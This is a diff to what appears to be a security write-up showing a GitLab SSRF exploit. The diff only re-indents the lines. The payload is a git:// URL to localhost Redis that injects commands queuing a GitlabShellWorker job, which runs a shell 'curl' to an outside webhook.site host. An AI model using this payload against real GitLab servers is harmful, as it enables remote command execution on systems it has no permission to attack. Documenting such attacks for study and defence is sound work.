@@ -61,11 +61,11 @@ We will first run through the steps, before explaining what each of these steps 
 
    ```text
    git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
-   multi
-   sadd resque:gitlab:queues system_hook_push
-   lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| curl https://webhook.site/807b6a27-314e-4947-b5f1-c384d8dc574f -k\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
-   exec
-   exec
+    multi
+    sadd resque:gitlab:queues system_hook_push
+    lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| curl https://webhook.site/807b6a27-314e-4947-b5f1-c384d8dc574f -k\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+    exec
+    exec
    /ssrf.git
    ```
 
